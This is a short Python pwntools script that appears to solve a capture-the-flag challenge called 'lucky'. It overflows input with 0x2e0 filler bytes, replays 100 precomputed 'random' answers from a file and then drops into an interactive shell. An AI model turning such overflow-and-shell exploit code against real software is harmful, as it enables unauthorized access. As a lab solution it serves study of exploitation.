#!/usr/bin/env python
from pwn import *

### DEBUGGGING ###

DEBUG = True

if DEBUG:
    r = process('lucky')
    timeout = 0.1

#    gdb.attach(r,'''
#    b main
#    ''')
    context.log_level = 'debug'

else:
    r = remote('',0)
    timeout = 0.3

def ss(s):
    sleep(timeout)
    return r.sendline(s)

def rr(s):
    sleep(timeout)
    return r.recvuntil(s)

### ADDRESS ###
### PAYLOAD ###

rd = (open('randmal', 'r').read()).split('\n')[:-1]
offset = 0x2e0

### EXPLOIT ###

def main():
    rr('?\n')
    ss('a' * offset)

    for i in range(0,100):
        rr(']\n')
        ss(rd[i])

    r.interactive()

if __name__ == '__main__':
    try:
        main()
    except:
        log.info('exception occur')
